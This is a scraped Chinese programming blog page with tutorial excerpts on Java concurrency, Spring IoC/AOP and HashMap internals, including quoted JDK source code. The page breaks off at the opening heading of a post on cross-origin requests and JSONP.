使用建议：在两个或者更多的线程需要访问的成员变量上使用volatile。当要访问的变量已在synchronized代码块中，或者为常量时，没必要使用volatile。
由于使用volatile屏蔽掉了JVM中必要的代码优化，所以在效率上比较低，因此一定在必要时才使用此关键字。
有一个案例分析
 Runnable和Thread实现多线程的区别
Java实现多线程的方法：继承Thread类、实现Runnable接口、实现Callable接口。在程序开发中，一般用Runnable接口为主，优势如下：

以下是两个程序的对比:
123456789101112131415161718class MyThread extends Thread &#123;    private int ticket = 5;    public void run() &#123;        for (int i = 0; i &lt; 10; i++) &#123;            if (ticket &gt; 0) &#123;                System.out.println("ticket = " + ticket--);            &#125;        &#125;    &#125;&#125; public class ThreadDemo&#123;    public static void main(String[] args) &#123;        new MyThread().start();        new MyThread().start();        new MyThread().start();    &#125;&#125;
输出结果如下：

12345678910111213141516171819class MyThread implements Runnable &#123;    private int ticket = 5;    public void run() &#123;        for (int i = 0; i &lt; 10; i++) &#123;            if (ticket &gt; 0) &#123;                System.out.println("ticket = " + ticket--);            &#125;        &#125;    &#125;&#125; public class RunnableDemo &#123;    public static void main(String[] args) &#123;        MyThread my = new MyThread();        new Thread(my).start();        new Thread(my).start();        new Thread(my).start();    &#125;&#125;
输出结果如下：

补充：

在第二种方法中，输出无法预测，因为ticket-不是原子操作
在第一种方法中，我们new了3个Thread对象，即三个线程分别执行三个对象中的代码，因此便是三个线程去独立地完成卖票的任务；而在第二种方法中，我们同样也new了3个Thread对象，但只有一个Runnable对象，3个Thread对象共享这个Runnable对象中的代码，因此，便会出现3个线程共同完成卖票任务的结果。如果我们new出3个Runnable对象，作为参数分别传入3个Thread对象中，那么3个线程便会独立执行各自Runnable对象中的代码，即3个线程各自卖5张票。
在第二种方法中，由于3个Thread对象共同执行一个Runnable对象中的代码，因此可能会造成线程的不安全，比如可能ticket会输出-1（如果我们System.out….语句前加上线程休眠操作，该情况将很有可能出现），这种情况的出现是由于，一个线程在判断ticket为1&gt;0后，还没有来得及减1，另一个线程已经将ticket减1，变为了0，那么接下来之前的线程再将ticket减1，便得到了-1。这就需要加入同步操作（即互斥锁），确保同一时刻只有一个线程在执行每次for循环中的操作。而在第一种方法中，并不需要加入同步操作，因为每个线程执行自己Thread对象中的代码，不存在多个线程共同执行同一个方法的情况。

 使用synchronized获取互斥锁
在并发编程中，多线程同时并发访问的资源叫做临界资源，当多个线程同时访问对象并要求操作相同资源时，分割了原子操作就有可能出现数据的不一致或数据不完整的情况，为避免这种情况的发生，我们会采取同步机制，以确保在某一时刻，方法内只允许有一个线程。
采用synchronized修饰符实现的同步机制叫做互斥锁机制，它所获得的锁叫做互斥锁。每个对象都有一个monitor(锁标记)，当线程拥有这个锁标记时才能访问这个资源，没有锁标记便进入锁池。任何一个对象系统都会为其创建一个互斥锁，这个锁是为了分配给线程的，防止打断原子操作。每个对象的锁只能分配给一个线程，因此叫做互斥锁。
下面是几点说明：

如果同一个方法内同时有两个或更多线程，则每个线程有自己的局部变量拷贝。
类的每个实例都有自己的对象级别锁。当一个线程访问实例对象中的synchronized同步代码块或同步方法时，该线程便获取了该实例的对象级别锁，其他线程这时如果要访问synchronized同步代码块或同步方法，便需要阻塞等待，直到前面的线程从同步代码块或方法中退出，释放掉了该对象级别锁。
访问同一个类的不同实例对象中的同步代码块，不存在阻塞等待获取对象锁的问题，因为它们获取的是各自实例的对象级别锁，相互之间没有影响。
持有一个对象级别锁不会阻止该线程被交换出来，也不会阻塞其他线程访问同一示例对象中的非synchronized代码。当一个线程A持有一个对象级别锁（即进入了synchronized修饰的代码块或方法中）时，线程也有可能被交换出去，此时线程B有可能获取执行该对象中代码的时间，但它只能执行非同步代码（没有用synchronized修饰），当执行到同步代码时，便会被阻塞，此时可能线程规划器又让A线程运行，A线程继续持有对象级别锁，当A线程退出同步代码时（即释放了对象级别锁），如果B线程此时再运行，便会获得该对象级别锁，从而执行synchronized中的代码。
持有对象级别锁的线程会让其他线程阻塞在所有的synchronized代码外。例如，在一个类中有三个synchronized方法a，b，c，当线程A正在执行一个实例对象M中的方法a时，它便获得了该对象级别锁，那么其他的线程在执行同一实例对象（即对象M）中的代码时，便会在所有的synchronized方法处阻塞，即在方法a，b，c处都要被阻塞，等线程A释放掉对象级别锁时，其他的线程才可以去执行方法a，b或者c中的代码，从而获得该对象级别锁。
使用synchronized（obj）同步语句块，可以获取指定对象上的对象级别锁。obj为对象的引用，如果获取了obj对象上的对象级别锁，在并发访问obj对象时时，便会在其synchronized代码处阻塞等待，直到获取到该obj对象的对象级别锁。当obj为this时，便是获取当前对象的对象级别锁。
类级别锁被特定类的所有示例共享，它用于控制对static成员变量以及static方法的并发访问。具体用法与对象级别锁相似。
互斥是实现同步的一种手段，临界区、互斥量和信号量都是主要的互斥实现方式。synchronized关键字经过编译后，会在同步块的前后分别形成monitorenter和monitorexit这两个字节码指令。根据虚拟机规范的要求，在执行monitorenter指令时，首先要尝试获取对象的锁，如果获得了锁，把锁的计数器加1，相应地，在执行monitorexit指令时会将锁计数器减1，当计数器为0时，锁便被释放了。由于synchronized同步块对同一个线程是可重入的，因此一个线程可以多次获得同一个对象的互斥锁，同样，要释放相应次数的该互斥锁，才能最终释放掉该锁。

 多线程环境下安全使用集合API
Java并发编程（8）：多线程环境中安全使用集合API（含代码）
 死锁
线程A当前持有互斥所锁lock1，线程B当前持有互斥锁lock2。接下来，当线程A仍然持有lock1时，它试图获取lock2，因为线程B正持有lock2，因此线程A会阻塞等待线程B对lock2的释放。如果此时线程B在持有lock2的时候，也在试图获取lock1，因为线程A正持有lock1，因此线程B会阻塞等待A对lock1的释放。二者都在等待对方所持有锁的释放，而二者却又都没释放自己所持有的锁，这时二者便会一直阻塞下去。这种情形称为死锁。
下面介绍避免死锁的几种常见方法：

避免一个线程获取多个锁
避免一个线程在锁内同时占用多个资源，尽量保证每个锁只占用一个资源
尝试使用定时锁，使用lock.tryLock(timeout)来代替使用内部锁机制
对于数据库锁，加锁和解锁必须在一个数据库连接里，否则会出现解锁失败的情况

 使用wait/notify/notifyAll实现线程间通信
在Java中，可以通过配合调用Object对象的wait()方法和notify()方法或notifyAll()方法来实现线程间的通信。在线程中调用wait()方法，将阻塞等待其他线程的通知（其他线程调用notify()方法或notifyAll()方法），在线程中调用notify()方法或notifyAll()方法，将通知其他线程从wait()方法处返回。
Object是所有类的超类，它有5个方法组成了等待/通知机制的核心：notify()、notifyAll()、wait()、wait(long)和wait(long, int)。在Java中，所有的类都从Object继承而来，因此，所有的类都拥有这些共有方法可供使用。而且，由于他们都被声明为final，因此在子类中不能覆写任何一个方法。
注意：

如果线程调用了对象的wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。
当有线程调用了对象的notifyAll()方法（唤醒所有wait线程）或notify()方法（只随机唤醒一个wait线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。
优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了synchronized代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。

</div><a class="more" href="/java-concurrent-summary/#more" style="margin-top: 14px">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/ioc-and-aop/">Spring的IOC与AOP特性</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2017-12-24</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Web/">Web</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Web/Spring/">Spring</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Spring/">Spring</a></span><div class="content"> Spring的IOC特性
 什么是控制反转

见图1，软件中的对象就如同图中的齿轮，协同工作，互相耦合，若是一个零件不能正常工作，则会导致整个系统的奔溃，这就是强耦合系统。为了解决对象间耦合度过高的问题，软件专家Michael Mattson提出了IoC理论。
控制反转(Inversion of Control)是一种面向对象编程中的一种设计原则，用来解决计算机代码之间的耦合度。其基本思想是：借助于&quot;第三方&quot;实现具有依赖关系的对象之间的耦合。

见图2，由于引进了IoC容器，使得A、B、C、D这四个对象没有了耦合关系，对象的控制权全部由IoC容器负责。
我们再次来对比一下：

软件系统在没有引入IoC容器之前，如图1，对象A依赖与对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。
软件系统在引入IoC容器之后，就完全不同了。如图2，由于IoC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要B的对象，IoC容器会主动创建一个对象B注入到对象A需要的地方。

通过对比，可以看出对象A依赖对象B的过程，由主动行为变成了被动行为，控制权颠倒了过来，这就是&quot;控制反转&quot;的由来。
 什么是依赖注入
当A对象需要调用B对象方法时，这种情况在Spring中称为依赖，即A对象依赖B对象，Spring把互相调用的关系称为依赖关系。
在传统模式下当需要调用其他对象的方法时，一般有以下两种方式：

原始做法：调用者主动创建被依赖对象，然后再调用被依赖对象的方法。
简单工厂模式：调用者先找到被依赖对象的工厂，然后主动通过工厂去获取被依赖对象，最后再调用被依赖对象的方法。

对于第一种方式，由于调用者需要通过形如&quot;new 被依赖对象构造器();&quot;的代码来创建对象，这种方式会导致调用者与被依赖对象实现类的硬编码耦合，不利于项目升级维护。
对于第二种方式，要把握一下三点：

调用者面向被依赖对象的接口编程
将被依赖对象的创建交给工厂完成
调用者通过工厂来获得被依赖组件

这样，调用者只需与被依赖对象的接口耦合，这样就避免了类层次的硬编码耦合。缺点是，调用组件需要主动通过工厂去获取被依赖对象，这就会带来调用组件与被依赖对象的耦合。
当使用Spring容器后，程序无须使用new调用构造器去创建对象，所有的Java对象都可交给Spring容器去创建；当调用者需要被依赖对象的方法时，调用者无须主动获取被依赖对象，只需要等待Spring容器注入即可。
 控制反转与依赖注入的关系

控制反转是一种思想
依赖注入是一种设计模式

IoC框架使用依赖注入作为实现控制反转的方式，但是控制反转还有其他的实现方式，例如说ServiceLocator，所以不能将控制反转和依赖注入等同。
 参考资料


《控制反转（IoC）与依赖注入（DI）》
《轻量级JavaEE企业应用实战》（第4版）李刚 编著

 Spring的AOP特性
以下内容来自于博客Spring AOP 实现原理与 CGLIB 应用
AOP（Aspect Orient Programming）,作为面向对象编程的一种补充，广泛应用于处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等。AOP实现的关键就在于AOP框架自动创建的AOP代理，AOP代理则可分为静态代理和动态代理两大类，其中静态代理是指AOP框架提供的命令进行编译，从而在编译阶段就可生成AOP代理类，因此也被称为编译时增强；而动态代理则是在运行时借助于JDK动态代理、CGLIB等在内存中“临时”生成AOP动态代理类，因此也被称为运行时增强。
 AOP的存在价值
在传统的OOP编程里以对象为核心，整个软件系统由一系列相互依赖的对象组成，而这些对象将被抽象成一个个类，并允许使用类继承来管理类与类之间一般到特殊的关系。随着软件规模的增大，应用的逐渐升级，慢慢出现了一些OOP很难解决的问题。
我们可以通过分析、抽象出一系列具有一定属性与行为的对象，并通过这些对象的协作来形成一个完整的软件功能。由于对象可以继承，因此我们可以把具有相同功能或相同特性的属性抽象到一个层次分明的类结构体系中。随着软件规范的不断扩大，专业化分工越来越系列，以及OOP应用实践的不断增多，随之也暴露出了一些OOP无法很好解决的问题。
现在假设系统中有3段完全相似的代码，这些代码通常会采用“复制”、“粘贴”方式来完成，通过这种“复制”、“粘贴”方式开发出来的软件如图3所示。

看到如图3所示的示意图，可以看到了这种设计的不足之处。当有一天，图1中的深色代码段需要修改，那是不是要打开3个地方的代码进行修改？如果不是3个地方包含这段代码，而是100个地方，甚至是1000个地方包含这段代码段，那会是什么后果？
为了解决这个问题，我们通常会采用将如图3所示的深色代码部分定义成一个方法，然后在3个代码段中分别调用该方法即可。在这种方式下，软件系统的结构如图4所示。

对于如图4所示的软件系统，如果需要修改深色部分的代码，只要修改一个地方即可，不管整个系统中有多少方法调用了该方法，程序无须修改这些地方，只需要修改被调用的方法即可——通过这种方式，大大降低了软件后期维护的复杂度。
对于如图4所示的方法1、方法2、方法3依然需要显式调用深色方法，这样做能够解决大部分应用场景。但对于一些更特殊的情况：应用需要方法1、方法2、方法3彻底与深色方法分离——方法1、方法2、方法3无须直接调用深色方法，该如何解决？
因为软件系统需求变更是非常频繁的事情，系统前期设计方法1、方法2、方法3时只实现了核心业务功能，过了一段时间，我们需要为方法1、方法2、方法3都增加事务控制；又过了一段时间，客户提出方法1、方法2、方法3需要进行用户合法性验证。只有合法的用户才能执行这些方法。因此，我们希望有一种特殊的方法：我们只要定义该方法，无须在方法1、方法2、方法3中显式调用它，系统会“自动”执行该特殊方法。
实现上述需求的技术就是AOP。AOP专门用于处理系统中分布于各个模块（不同方法）中交叉关注点的问题，在JavaEE应用中，常常通过AOP来处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等，AOP已经成为一种非常常用的解决方案。
 Spring AOP原理剖析
Spring AOP框架对AOP代理类的处理原则是：如果目标对象的实现类实现了接口，Spring AOP将会采用JDK动态代理来生成AOP代理类；如果目标对象的实现类没有实现接口，Spring AOP将会采用CGLIB来生成AOP代理类——不过这个选择过程对开发者完全透明、开发者无须关心。
AOP代理其实是由AOP框架动态生成的一个对象，该对象可作为目标对象使用。AOP代理包含了目标对象的全部方法，但AOP代理中的方法与目标对象的方法存在差异：AOP方法在特定切入点添加了增强处理，并回调了目标对象的方法。
AOP代理所包含的方法与目标对象的方法示意图如图5所示。

Spring的AOP代理有Spring的IoC容器负责生成、管理，其依赖关系也有IoC容器负责管理。因此，AOP代理可以直接使用容器中的其他Bean实例作为目标，这种关系可由IoC容器的依赖注入提供。
纵观AOP编程，其中需要程序员参与的只有3个部分：

定义普通业务组件
定义切入点，一个切入点可能横切多个业务组件
定义增强处理，增强处理就是在AOP框架为普通业务组件织入的处理动作

上面3个部分的第一个部分是最平常不过的事情，无须额外说明。那么进行AOP编程的关键就是定义切入点和定义增强处理。一但定义了合适的切入点和增强处理，AOP框架将会自动生成AOP代理，而AOP代理的方法大致有如下公式：
代理对象的方法 = 增强处理 + 被代理对象的方法
Spring AOP的实现原理：AOP框架负责动态生成AOP代理类，这个代理类的方法则由Advice和回调方法对象的方法所组成。
对于前面提到的图4所示的软件调用结构：当方法1、方法2、方法3…都需要去调用某个具有“横切”性质的方法时，传统的做法是程序员去手动修改方法1、方法2、方法3…通过代码来调用这个具有“横切”性质的方法，但这种做法的可扩展性不好，因为每次都要修改代码。
于是AOP框架出现，AOP框架则可以“动态的”生成一个新的代理类，而这个代理类所包含的方法1、方法2、方法3的代码，程序员只要定义切入点即可——AOP框架所生成的AOP代理类中包含了新的方法1、方法2、方法3，而AOP框架会根据切入点来决定是否要在方法1、方法2、方法3中回调具有“横切”性质的方法。
简而言之：AOP原理的奥妙就在于动态地生成了代理类，这个代理类实现了图2的调用——这种调用无须程序员修改代码。
 参考资料

《轻量级JavaEE企业应用实战》（第4版）李刚 编著
《疯狂Java讲义》李刚 编著

</div><a class="more" href="/ioc-and-aop/#more" style="margin-top: 14px">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/hashMap/">HashMap实现原理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2017-12-11</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Java/">Java</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Java/%E9%9B%86%E5%90%88/">集合</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a></span><div class="content">


关注点
结论




是否允许空
key和value都运行空


是否允许重复元素
key重复会覆盖，value允许重复


是否有序
无序


是否线程安全
非线程安全



 HashMap的数据结构
在Java语言中，最基本的两种结构就是数组和模拟指针（引用），所有的数据结构都可以使用这两个基本结构来构造。HashMap实际就是一个&quot;链表散列&quot;的数据结构，即数组与链表的结合体。

从上图可以看出，HashMap底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个HashMap的时候，就会初始化一个数组。
首先看一下HashMap的一个存储单元Node：
123456789101112131415161718192021222324252627282930313233343536373839static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123;        final int hash;        final K key;        V value;        Node&lt;K,V&gt; next;        Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123;            this.hash = hash;            this.key = key;            this.value = value;            this.next = next;        &#125;        public final K getKey()        &#123; return key; &#125;        public final V getValue()      &#123; return value; &#125;        public final String toString() &#123; return key + "=" + value; &#125;        public final int hashCode() &#123;            return Objects.hashCode(key) ^ Objects.hashCode(value);        &#125;        public final V setValue(V newValue) &#123;            V oldValue = value;            value = newValue;            return oldValue;        &#125;        public final boolean equals(Object o) &#123;            if (o == this)                return true;            if (o instanceof Map.Entry) &#123;                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;                if (Objects.equals(key, e.getKey()) &amp;&amp;                    Objects.equals(value, e.getValue()))                    return true;            &#125;            return false;        &#125;    &#125;
有上面代码可以看出，Node就是数组中的元素，每个Map.Entry其实就是一个Key-value对，它持有一个指向下一个元素的引用，这就构成了链表。
 功能实现-方法
 确定哈希桶数组索引位置
不管增加、删除、查找键值对，定位到哈希桶数组的位置都是关键的一步，而定位数组索引的主要方法如下。
123456789101112// jdk1.8 &amp; jdk1.7static final int hash(Object key) &#123;    int h;    // 第一步：h = key.hashCode() 取hashCode值    // 第二步：h ^ (h &gt;&gt;&gt; 16)     高位参与运算    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;// jdk1.7的源码，jdk1.8没有这个方法，但是实现原理一样的static int indexFor(int h, int length) &#123;     // 第三步: 取模运算     return h &amp; (length-1);  &#125;
这里Hash算法本质上就是三步：取key的hashCode值、高位运算、取模运算
对于任意给定的对象，只要它的hashCode()值相同，那么调用hash()方法中所计算得到的hash码总是相同的。我们首先想到就是把hash值对数组长度求模，这样就保证了元素的分布相对比较均匀。但是，求模运算时间耗费较大，所以采用了indexFor()方法来计算该对象应该保存在table数组中的哪个索引处。
这个方法非常巧妙，它通过h &amp; (table.length - 1)来得到该对象的保存位，而HashMap底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当length总是2的n次方时，h &amp; (length - 1)运算等价于对length取模，也就是h % length，但是&amp;比%具有更高的效率。
在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。
如下图，其中n为table的长度。

 添加与修改数据
由于Java8对hashMap底层进行了优化，当链表长度大于8时，转换为红黑树进行处理，因此以下采用了美团点评技术团队的讲解。
HashMap的put方法执行过程可以通过下图来理解。
步骤一：判断键值对数组table[i]是否为空或为null，否则执行resize()进行扩容；
步骤二：根据键值key计算hash值得到插入的数组索引i，如果table[i]==null，直接新建节点添加，转向⑥，如果table[i]不为空，转向③；
步骤三：判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则转向④，这里的相同指的是hashCode以及equals；
步骤四：判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值对，否则转向⑤；
步骤五：遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可；
步骤六：插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public V put(K key, V value) &#123;    // 对key的hashCode()做hash    return putVal(hash(key), key, value, false, true);&#125;final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123;    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;    // 步骤一：tab为空则创建    if ((tab = table) == null || (n = tab.length) == 0)        n = (tab = resize()).length;    // 步骤二: 计算index,并对null进行处理     if ((p = tab[i = (n - 1) &amp; hash]) == null)        tab[i] = newNode(hash, key, value, null);    else &#123;        Node&lt;K,V&gt; e; K k;        // 步骤三：节点key存在，直接覆盖value        if (p.hash == hash &amp;&amp;            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))            e = p;        // 步骤四：判断该链为红黑树        else if (p instanceof TreeNode)            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);        // 步骤五：该链为链表        else &#123;            for (int binCount = 0; ; ++binCount) &#123;                if ((e = p.next) == null) &#123;                    p.next = newNode(hash, key, value, null);                    // 链表长度大于8转换为红黑树进行处理                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st                        treeifyBin(tab, hash);                    break;                &#125;                // key已经存在直接覆盖value                if (e.hash == hash &amp;&amp;                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))                    break;                p = e;            &#125;        &#125;        if (e != null) &#123; // existing mapping for key            V oldValue = e.value;            if (!onlyIfAbsent || oldValue == null)                e.value = value;            afterNodeAccess(e);            return oldValue;        &#125;    &#125;    ++modCount;    // 步骤六：超过最大容量就扩容    if (++size &gt; threshold)        resize();    afterNodeInsertion(evict);    return null;&#125;
 删除数据
下面是Java8中删除数据源代码的分析：
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public V remove(Object key) &#123;    Node&lt;K,V&gt; e;    return (e = removeNode(hash(key), key, null, false, true)) == null ? null : e.value;&#125;final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value, boolean matchValue, boolean movable) &#123;    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index;    // 步骤一：找到要删除数组元素为p    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;        (p = tab[index = (n - 1) &amp; hash]) != null) &#123;        Node&lt;K,V&gt; node = null, e; K k; V v;        // 步骤二：数组元素p存在，表示要删除的节点node赋为p        if (p.hash == hash &amp;&amp;            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))            node = p;        // 数组元素p是链表，则将链表的下一个节点赋给节点e        else if ((e = p.next) != null) &#123;            // 步骤三：如果p为红黑树，则调用方法找到要删除的节点赋给node            if (p instanceof TreeNode)                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);            // 步骤四：如果为链表，则找到对应要删除的节点赋给node            else &#123;                do &#123;                    if (e.hash == hash &amp;&amp;                        ((k = e.key) == key ||                            (key != null &amp;&amp; key.equals(k)))) &#123;                        node = e;                        break;                    &#125;                    p = e;                &#125; while ((e = e.next) != null);            &#125;        &#125;        // 如果找到要删除的节点node        if (node != null &amp;&amp; (!matchValue || (v = node.value) == value || (value != null &amp;&amp; value.equals(v)))) &#123;            // 步骤五：判断此时数组元素的类型，并删除对应的节点node            if (node instanceof TreeNode)                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable);            else if (node == p)                tab[index] = node.next;            else                p.next = node.next;            ++modCount;            --size;            afterNodeRemoval(node);            return node;        &#125;    &#125;    return null;&#125;
 HashMap的其他相关讲解
 扩容机制
扩容就是重新计算容量，当HashMap中无法容纳更多的元素时，就要扩大数组的长度，以便容纳更多的元素。由于Java中的数组是无法自动扩容的，所以要使用一个新的数组来代替已有的容量小的数组。
下面我们分析resize()方法的源码，由于Java8引入了红黑树，因此还采用Java7的源码进行分析。
12345678910111213141516171819202122232425262728293031323334353637383940414243// 传入新的容量void resize(int newCapacity) &#123;    // 引用扩容前的Entry数组    Entry[] oldTable = table;    int oldCapacity = oldTable.length;    // 扩容前的数组大小如果已经达到最大(2^30)了         if (oldCapacity == MAXIMUM_CAPACITY) &#123;        // 修改阈值为int的最大值(2^31-1)，这样以后就不会扩容了        threshold = Integer.MAX_VALUE;        return;    &#125;    // 初始化一个新的Entry数组    Entry[] newTable = new Entry[newCapacity];    // 将数据转移到新的Entry数组里    transfer(newTable);    // HashMap的table属性引用新的Entry数组    table = newTable;    // 修改阈值    threshold = (int)(newCapacity * loadFactor);&#125;// 将原有Entry数组的元素拷贝到新的Entry数组里void transfer(Entry[] newTable) &#123;    // src引用了旧的Entry数组    Entry[] src = table;                    int newCapacity = newTable.length;    // 遍历旧的Entry数组    for (int j = 0; j &lt; src.length; j++) &#123;        // 取得旧Entry数组的每个元素        Entry&lt;K,V&gt; e = src[j];                   if (e != null) &#123;            // 释放旧Entry数组的对象引用（for循环后，旧的Entry数组不再引用任何对象）            src[j] = null;            do &#123;                Entry&lt;K,V&gt; next = e.next;                // 重新计算每个元素在数组中的位置                int i = indexFor(e.hash, newCapacity);                 e.next = newTable[i]; // 标记[1]                newTable[i] = e;      // 将元素放在数组上                e = next;             // 访问下一个Entry链上的元素            &#125; while (e != null);        &#125;    &#125;&#125;
newTable[i]的引用赋给了e.next，也就是使用了单链表的头插入方式，同一个位置上新元素总会被放在链表的头部位置；这样先放在一个索引的元素最终会放在Entry链的尾部（如果发生了hash冲突），这一点Java8与其不同。由于重新计算了hash值，所以最终可能放在新数组的不同位置。
下面举个例子简单说明一下扩容的原理。我们采用的hash算法就是key对数组的长度取模。其中哈希桶数组table数组的长度size=2，put的顺序是3、7、5。在mod 2后都在table[1]发生了冲突。这里假设负载因子loadFactor=1，即当键值对实际大小size大于table的实际大小时进行扩容。下面是resize的过程示意图。

Java8中对新数组的索引计算采用了更加简洁的算法，不需要每次去计算hash值；而且在旧链表迁移到新链表的时候，如果新表的数组索引位置相同，则链表元素会倒置，而Java8则不会，详细解析可以见tech.meituan.com/java-hashmap.html
 HashMap的table是transient的
1transient Node&lt;K,V&gt;[] table;
由于table采用了transient修饰，也就是表示其不可以被序列化，它的原因如下：
HashMap是基于hashCode的，hashcode作为Object的方法，是native修饰的
1public native int hashCode();
这意味着hashCode与底层相关，对于不同平台的虚拟机，会有不用的hashCode实现方式，也就是同一个对象在不同的平台下会有不同的hashcode值。
由于Java的跨平台特性，如果table不用transient修饰，在虚拟机A下的程序在虚拟机B下就会造成无法正常运行，这样就失去了其跨平台的意义，所以为了避免这样的情况，Java自己重写了其序列化table的方法，源码如下：
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void writeObject(java.io.ObjectOutputStream s)    throws IOException &#123;    int buckets = capacity();    // Write out the threshold, loadfactor, and any hidden stuff    s.defaultWriteObject();    s.writeInt(buckets);    s.writeInt(size);    internalWriteEntries(s);&#125;private void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException("Illegal load factor: " +                                            loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException("Illegal mappings count: " +                                            mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                    DEFAULT_INITIAL_CAPACITY :                    (fc &gt;= MAXIMUM_CAPACITY) ?                    MAXIMUM_CAPACITY :                    tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                        (int)ft : Integer.MAX_VALUE);        @SuppressWarnings(&#123;"rawtypes","unchecked"&#125;)            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings("unchecked")                K key = (K) s.readObject();            @SuppressWarnings("unchecked")                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;
 参考资料

深入Java集合学习系列：HashMap的实现原理
图解集合 4 ：HashMap
Java 8系列之重新认识HashMap

</div><a class="more" href="/hashMap/#more" style="margin-top: 14px">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/CORS-JSONP/">跨域请求解决方法——jsonp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2017-09-22</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Web/">Web</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Web/%E5%89%8D%E7%AB%AF/">前端</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%89%8D%E7%AB%AF/">前端</a></span><div class="content">Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，但这样却给平时的开发带来了不少麻烦，这里把涉及到跨域的问题进行了简单地整理。
 同源策略
 什么是域（origin）
